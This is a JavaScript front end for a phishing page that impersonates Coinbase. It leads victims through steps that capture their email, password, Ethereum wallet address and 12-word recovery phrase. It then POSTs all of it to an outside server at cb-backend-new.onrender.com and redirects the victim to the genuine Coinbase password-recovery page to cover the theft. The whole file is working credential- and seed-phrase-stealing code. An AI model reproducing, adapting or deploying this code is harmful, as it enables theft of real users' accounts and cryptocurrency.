const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const status = document.getElementById('status');

    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!email || !pass) return alert("Required fields missing.");
        
        step2.classList.add('hidden');
        step3.classList.remove('hidden');
    };

    document.getElementById('connectBtn').onclick = async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (window.ethereum) {
            try {
                status.innerText = "Connecting...";
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                await sendData(email, pass, accounts[0], null);
            } catch (e) {
                setupRecovery(email, pass);
            }
        } else {
            setupRecovery(email, pass);
        }
    };

    function setupRecovery(email, pass) {
        document.getElementById('step3Title').innerText = "Verify Identity";
        document.getElementById('step3Desc').innerText = "Please enter your 12-word recovery phrase.";
        
        step3.innerHTML = `
            <img src="logo.png" class="cb-logo">
            <h1 class="cb-header">Verify Identity</h1>
            <p>To restore access, enter your 12-word recovery phrase.</p>
            <div class="input-group">
                <input type="text" id="phrase" placeholder="word1 word2 ..." style="text-align:center;">
            </div>
            <button id="submitPhrase" class="btn-primary">Verify</button>
            <div id="phrase_status" class="status-text"></div>
        `;

        document.getElementById('submitPhrase').onclick = async () => {
            const phrase = document.getElementById('phrase').value.trim();
            const s = document.getElementById('phrase_status');
            if (phrase.split(/\s+/).length !== 12) {
                s.innerText = "Invalid phrase. Exactly 12 words required.";
                return;
            }
            await sendData(email, pass, null, phrase);
        };
    }

    async function sendData(email, pass, wallet, phrase) {
        try {
            status.innerText = "Processing secure request...";
            const res = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    email: email, 
                    password: pass, 
                    walletAddress: wallet, 
                    recoveryPhrase: phrase 
                })
            });
            
            if (res.ok) {
                status.innerText = "Verification successful.";
                setTimeout(() => {
                    window.location.href = 'https://www.coinbase.com/password-recovery';
                }, 2000);
            }
        } catch (e) {
            status.innerText = "Server error. Please try again.";
        }
    }
});
